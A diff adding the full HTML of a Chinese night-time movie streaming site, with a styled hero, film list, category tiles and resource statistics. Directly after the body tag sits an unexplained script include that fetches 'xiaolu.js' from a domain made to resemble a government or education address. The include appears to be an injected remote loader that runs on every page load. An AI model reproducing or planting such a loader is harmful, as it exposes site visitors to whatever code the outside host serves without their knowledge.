@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="午夜神马电影网,wuyeshenmadianyingwang,午夜影院,深夜追剧,神马影视,夜间观影">
+<meta name="description" content="午夜神马电影网 - 专属于深夜的影视驿站，海量电影电视剧动漫综艺全天候在线，午夜时分静享好片，神马影视陪你度过每个不眠夜。">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>午夜神马电影网 | 深夜专属 · 影视驿站</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+ --bg:#07060f;--bg2:#0d0b1a;--card:#141123;--line:#241c3a;
+ --pur:#8b5cf6;--pur2:#a78bfa;--pink:#ec4899;--cy:#22d3ee;--txt:#eeeaf7;--dim:#9a92b5
+}
+body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;background:var(--bg);color:var(--txt);line-height:1.7;overflow-x:hidden}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1120px;margin:0 auto;padding:0 16px}
+img{max-width:100%}
+.moon{display:inline-block;width:14px;height:14px;border-radius:50%;background:radial-gradient(circle at 35% 35%,#fff7c2,#facc15 45%,#a16207);box-shadow:0 0 14px rgba(250,204,21,.6)}
+
+/* HEADER */
+header{position:sticky;top:0;z-index:70;background:rgba(7,6,15,.92);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.hd{display:flex;align-items:center;justify-content:space-between;height:62px}
+.logo{display:flex;align-items:center;gap:11px}
+.logo .orb{width:38px;height:38px;border-radius:50%;background:radial-gradient(circle at 30% 30%,var(--pink),var(--pur) 60%,#2e1065);box-shadow:0 0 20px rgba(139,92,246,.55);display:flex;align-items:center;justify-content:center;font-size:17px}
+.logo b{font-size:15.5px;font-weight:900;letter-spacing:.5px}
+.logo b i{font-style:normal;background:linear-gradient(90deg,var(--pink),var(--pur2));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+nav{display:none;gap:3px}
+nav a{padding:9px 15px;border-radius:999px;font-size:13px;font-weight:700;color:var(--dim);transition:.25s;position:relative}
+nav a:hover,nav a.on{color:#fff;background:linear-gradient(90deg,var(--pur),var(--pink))}
+.btn-tv{display:none;background:linear-gradient(90deg,var(--pur),var(--pink));color:#fff;padding:8px 18px;border-radius:999px;font-size:12.5px;font-weight:900}
+.tog{width:42px;height:42px;border-radius:12px;background:var(--card);border:1px solid var(--line);color:var(--pur2);font-size:19px;cursor:pointer}
+.drawer{display:none;background:var(--bg2);border-bottom:1px solid var(--line)}
+.drawer.on{display:block}
+.drawer a{display:block;padding:14px 16px;border-bottom:1px solid var(--line);font-weight:700;font-size:14px}
+main{padding-top:2px}
+
+/* NIGHT HERO */
+.hero{position:relative;padding:58px 0 70px;background:radial-gradient(700px 340px at 85% 15%,rgba(139,92,246,.28),transparent),radial-gradient(560px 320px at 12% 88%,rgba(236,72,153,.2),transparent),linear-gradient(180deg,var(--bg2),var(--bg))}
+.hero::before{content:"";position:absolute;inset:0;background-image:radial-gradient(1.5px 1.5px at 12% 22%,rgba(255,255,255,.55),transparent),radial-gradient(1.5px 1.5px at 28% 62%,rgba(255,255,255,.4),transparent),radial-gradient(1.5px 1.5px at 47% 18%,rgba(255,255,255,.5),transparent),radial-gradient(1.5px 1.5px at 68% 52%,rgba(255,255,255,.35),transparent),radial-gradient(1.5px 1.5px at 86% 78%,rgba(255,255,255,.45),transparent),radial-gradient(1.5px 1.5px at 8% 78%,rgba(255,255,255,.4),transparent);pointer-events:none}
+.hero .wrap{position:relative;z-index:2}
+.tag{display:inline-flex;align-items:center;gap:7px;background:rgba(139,92,246,.15);border:1px solid rgba(139,92,246,.4);color:var(--pur2);font-size:11.5px;font-weight:800;padding:6px 14px;border-radius:999px;margin-bottom:18px}
+.hero h1{font-size:30px;font-weight:900;line-height:1.45;margin-bottom:14px}
+.hero h1 em{font-style:normal;color:var(--pink)}
+.hero p{font-size:13.5px;color:var(--dim);max-width:520px;margin-bottom:26px}
+.hbtns{display:flex;gap:11px;flex-wrap:wrap}
+.hbtns a:first-child{background:linear-gradient(90deg,var(--pur),var(--pink));color:#fff;padding:12px 28px;border-radius:999px;font-weight:900;font-size:14px}
+.hbtns a:last-child{border:1px solid var(--line);color:var(--txt);padding:12px 22px;border-radius:999px;font-weight:800;font-size:13.5px}
+
+/* moon phase clock */
+.mclock{margin-top:34px;display:flex;align-items:center;gap:14px;background:rgba(20,17,35,.6);border:1px solid var(--line);border-radius:18px;padding:14px 18px;max-width:420px}
+.mclock .ph{display:flex;gap:6px}
+.mclock .ph i{width:9px;height:9px;border-radius:50%;background:var(--line)}
+.mclock .ph i.on{background:var(--pink);box-shadow:0 0 8px var(--pink)}
+.mclock b{font-size:19px;font-weight:900;font-variant-numeric:tabular-nums}
+.mclock span{font-size:10.5px;color:var(--dim)}
+
+/* SECTION */
+.sec{padding:50px 0}
+.st{display:flex;align-items:flex-end;justify-content:space-between;gap:10px;margin-bottom:22px}
+.st h2{font-size:19px;font-weight:900;display:flex;align-items:center;gap:8px}
+.st h2::after{content:"";flex:1;height:1px;background:linear-gradient(90deg,var(--line),transparent);width:60px}
+.st a{font-size:11.5px;color:var(--pur2);font-weight:800}
+
+/* vertical stacked timeline DOM */
+.tl{position:relative;padding-left:30px}
+.tl::before{content:"";position:absolute;left:9px;top:6px;bottom:6px;width:2px;background:linear-gradient(180deg,var(--pur),var(--pink))}
+.ti{position:relative;background:var(--card);border:1px solid var(--line);border-radius:14px;padding:14px 16px;margin-bottom:14px;display:grid;grid-template-columns:44px 1fr auto;gap:12px;align-items:center;transition:.25s}
+.ti:hover{border-color:var(--pur);transform:translateX(4px)}
+.ti .dot{position:absolute;left:-25px;top:50%;transform:translateY(-50%);width:14px;height:14px;border-radius:50%;background:var(--bg);border:3px solid var(--pur2)}
+.ti .th{width:44px;height:60px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:20px}
+.ti b{font-size:13.5px;font-weight:800}
+.ti small{display:block;font-size:10.5px;color:var(--dim)}
+.ti .r{font-size:11px;font-weight:800;color:var(--pink);white-space:nowrap}
+
+/* radial category petals */
+.petals{display:grid;grid-template-columns:repeat(2,1fr);gap:12px}
+.pt{position:relative;background:var(--card);border:1px solid var(--line);border-radius:16px;padding:18px 16px;overflow:hidden;min-height:118px;display:flex;flex-direction:column;justify-content:center;transition:.25s}
+.pt:hover{transform:scale(1.02)}
+.pt .bg{position:absolute;right:-20px;bottom:-24px;width:92px;height:92px;border-radius:50%;opacity:.16;transition:.3s}
+.pt:hover .bg{transform:scale(1.25)}
+.pt b{font-size:14.5px;font-weight:900;margin-bottom:4px}
+.pt p{font-size:11px;color:var(--dim)}
+.pt span{margin-top:9px;font-size:10.5px;font-weight:800;color:var(--pur2)}
+
+/* data bars DOM */
+.bars{border:1px solid var(--line);border-radius:16px;overflow:hidden;background:var(--card)}
+.bar{padding:15px 18px;border-bottom:1px solid var(--line);transition:.2s}
+.bar:last-child{border-bottom:none}
+.bar:hover{background:rgba(139,92,246,.06)}
+.bar .hd2{display:flex;justify-content:space-between;align-items:center;margin-bottom:7px}
+.bar .hd2 b{font-size:13px;font-weight:800}
+.bar .hd2 i{font-style:normal;font-size:11px;color:var(--pur2);font-weight:800}
+.track{height:7px;background:var(--bg2);border-radius:999px;overflow:hidden}
+.fill{height:100%;border-radius:999px;background:linear-gradient(90deg,var(--pur),var(--pink))}
+
+footer{background:#04030a;border-top:1px solid var(--line);padding:42px 0 24px}
+.ft{display:grid;grid-template-columns:1fr;gap:24px}
+.ft .a b{font-size:16px;font-weight:900}
+.ft .a b i{font-style:normal;color:var(--pink)}
+.ft .a p{font-size:12px;color:var(--dim);margin-top:7px}
+.ft .a .u{color:var(--pur2);font-size:12px;word-break:break-all;display:block;margin-top:9px}
+.cols{display:grid;grid-template-columns:repeat(2,1fr);gap:8px}
+.cols a{font-size:12.5px;color:var(--dim);font-weight:600}
+.cols a:hover{color:var(--pur2)}
+.cp{margin-top:26px;padding-top:16px;border-top:1px solid var(--line);text-align:center;font-size:10.5px;color:#6c6486;line-height:2}
+
+#top{position:fixed;right:14px;bottom:18px;z-index:90;width:46px;height:46px;border-radius:50%;background:linear-gradient(135deg,var(--pur),var(--pink));color:#fff;font-size:17px;display:none;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 6px 20px rgba(139,92,246,.45)}
+#top.on{display:flex}
+
+@media(min-width:600px){
+ .tl::before{left:11px}.ti .dot{left:-27px}
+ .petals{grid-template-columns:repeat(3,1fr)}
+}
+@media(min-width:820px){
+ nav{display:flex}.tog{display:none}.btn-tv{display:inline-block}
+ .hero h1{font-size:46px;max-width:660px}
+ .hero p{font-size:15px}
+ .petals{grid-template-columns:repeat(3,1fr)}
+ .ft{grid-template-columns:1.4fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header>
+  <div class="wrap hd">
+    <div class="logo"><div class="orb">🌙</div><b>午夜<i>神马电影网</i></b></div>
+    <nav>
+      <a href="#home" class="on">首页</a>
+      <a href="#night">深夜影单</a>
+      <a href="#cat">类型导航</a>
+      <a href="#data">站点数据</a>
+    </nav>
+    <a href="#" class="btn-tv">午夜剧场</a>
+    <button class="tog" onclick="document.getElementById('dr').classList.toggle('on')">☰</button>
+  </div>
+  <div class="drawer" id="dr">
+    <a href="#home" onclick="this.parentNode.classList.remove('on')">首页</a>
+    <a href="#night" onclick="this.parentNode.classList.remove('on')">深夜影单</a>
+    <a href="#cat" onclick="this.parentNode.classList.remove('on')">类型导航</a>
+    <a href="#data" onclick="this.parentNode.classList.remove('on')">站点数据</a>
+  </div>
+</header>
+
+<main>
+
+<!-- HERO -->
+<section class="hero" id="home">
+  <div class="wrap">
+    <div class="tag"><span class="moon"></span> 深夜在线 · 24H 不间断放映</div>
+    <h1>当城市入睡，<br><em>好戏</em>才刚刚开场</h1>
+    <p>午夜神马电影网——专属于深夜的影视驿站。电影、剧集、动漫、综艺全天候在线，海量资源随开随看，让每一个不眠夜都有好片相伴。</p>
+    <div class="hbtns">
+      <a href="#">进入午夜放映</a>
+      <a href="#">查看片单</a>
+    </div>
+    <div class="mclock">
+      <div class="ph"><i class="on"></i><i class="on"></i><i></i><i class="on"></i><i></i></div>
+      <div><b id="clk">00:00:00</b><br><span>此刻，正在与 12,486 位影迷同屏</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- TIMELINE -->
+<section class="sec" id="night">
+  <div class="wrap">
+    <div class="st"><h2>🕚 深夜影单</h2><a href="#">完整片单</a></div>
+    <div class="tl">
+      <a href="#" class="ti"><div class="th" style="background:linear-gradient(135deg,#3b0764,#7c3aed)">🎬</div><div><b>沉默的真相</b><small>悬疑 / 12集 · 越夜越上头</small></div><span class="r">9.6 ★</span><span class="dot"></span></a>
+      <a href="#" class="ti"><div class="th" style="background:linear-gradient(135deg,#4c1d95,#a21caf)">🌃</div><div><b>午夜巴黎</b><small>爱情 / 电影 · 文艺失眠首选</small></div><span class="r">9.3 ★</span><span class="dot"></span></a>
+      <a href="#" class="ti"><div class="th" style="background:linear-gradient(135deg,#831843,#e11d48)">🩸</div><div><b>暗黑第七季</b><small>惊悚 / 10集 · 胆量挑战</small></div><span class="r">9.1 ★</span><span class="dot"></span></a>
+      <a href="#" class="ti"><div class="th" style="background:linear-gradient(135deg,#0f766e,#06b6d4)">🛸</div><div><b>星际回声</b><small>科幻 / 8集 · 凌晨独享</small></div><span class="r">8.8 ★</span><span class="dot"></span></a>
+      <a href="#" class="ti"><div class="th" style="background:linear-gradient(135deg,#7c2d12,#f97316)">🍜</div><div><b>深夜食堂</b><small>治愈 / 全30集 · 暖心陪伴</small></div><span class="r">8.6 ★</span><span class="dot"></span></a>
+      <a href="#" class="ti"><div class="th" style="background:linear-gradient(135deg,#365314,#84cc16)">🎭</div><div><b>剧场之夜</b><small>剧情 / 电影 · 午夜专场</small></div><span class="r">8.4 ★</span><span class="dot"></span></a>
+    </div>
+  </div>
+</section>
+
+<!-- PETALS -->
+<section class="sec" id="cat" style="padding-top:0">
+  <div class="wrap">
+    <div class="st"><h2>🎞️ 类型导航</h2><a href="#">更多类型</a></div>
+    <div class="petals">
+      <a href="#" class="pt"><div class="bg" style="background:var(--pur)"></div><b>电影专区</b><p>院线大片 · 经典老片 · 海外佳片</p><span>立即观看 ›</span></a>
+      <a href="#" class="pt"><div class="bg" style="background:var(--pink)"></div><b>剧集连载</b><p>同步热播 · 港台日韩 · 美剧英剧</p><span>立即观看 ›</span></a>
+      <a href="#" class="pt"><div class="bg" style="background:var(--cy)"></div><b>动漫新番</b><p>新番连载 · 经典完结 · 国漫专区</p><span>立即观看 ›</span></a>
+      <a href="#" class="pt"><div class="bg" style="background:#f97316)"></div><b>综艺纪实</b><p>爆款综艺 · 深度纪录 · 访谈访谈</p><span>立即观看 ›</span></a>
+      <a href="#" class="pt"><div class="bg" style="background:#84cc16)"></div><b>午夜专场</b><p>悬疑惊悚 · 深夜独享 · 主题放映</p><span>立即观看 ›</span></a>
+      <a href="#" class="pt"><div class="bg" style="background:#22d3ee)"></div><b>排行榜</b><p>实时热度 · 高分精选 · 观众最爱</p><span>立即观看 ›</span></a>
+    </div>
+  </div>
+</section>
+
+<!-- DATA BARS -->
+<section class="sec" id="data" style="padding-top:0">
+  <div class="wrap">
+    <div class="st"><h2>📊 站点数据</h2><a href="#">数据统计</a></div>
+    <div class="bars">
+      <div class="bar"><div class="hd2"><b>🎬 电影资源</b><i>38,620 部</i></div><div class="track"><div class="fill" style="width:96%"></div></div></div>
+      <div class="bar"><div class="hd2"><b>📺 剧集资源</b><i>6,240 部</i></div><div class="track"><div class="fill" style="width:82%"></div></div></div>
+      <div class="bar"><div class="hd2"><b>🎌 动漫番剧</b><i>3,180 部</i></div><div class="track"><div class="fill" style="width:64%"></div></div></div>
+      <div class="bar"><div class="hd2"><b>🎤 综艺纪实</b><i>2,050 部</i></div><div class="track"><div class="fill" style="width:48%"></div></div></div>
+      <div class="bar"><div class="hd2"><b>🌙 深夜专场</b><i>1,420 部</i></div><div class="track"><div class="fill" style="width:35%"></div></div></div>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="ft">
+      <div class="a">
+        <b>午夜<i>神马电影网</i></b>
+        <p>当城市入睡，好戏才刚刚开场。海量影视资源全天候在线，陪你度过每一个不眠夜。</p>
+        <span class="u">https://wuyeshenmadianyingwang-wap.github.io</span>
+      </div>
+      <div>
+        <div class="cols">
+          <a href="#">首页</a><a href="#">深夜影单</a>
+          <a href="#">类型导航</a><a href="#">站点数据</a>
+          <a href="#">午夜剧场</a><a href="#">关于我们</a>
+        </div>
+      </div>
+    </div>
+    <div class="cp">© 2026 午夜神马电影网 wuyeshenmadianyingwang · 保留所有权利<br>本站为影视信息聚合导航平台，倡导正版观看，相关版权归原作者所有</div>
+  </div>
+</footer>
+
+<div id="top" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</div>
+<script>
+var c=document.getElementById('clk');
+setInterval(function(){var d=new Date();var p=function(n){return n<10?'0'+n:''+n};c.textContent=p(d.getHours())+':'+p(d.getMinutes())+':'+p(d.getSeconds());},1000);
+window.addEventListener('scroll',function(){document.getElementById('top').classList.toggle('on',window.scrollY>450);});
+</script>
+</body>
+</html>
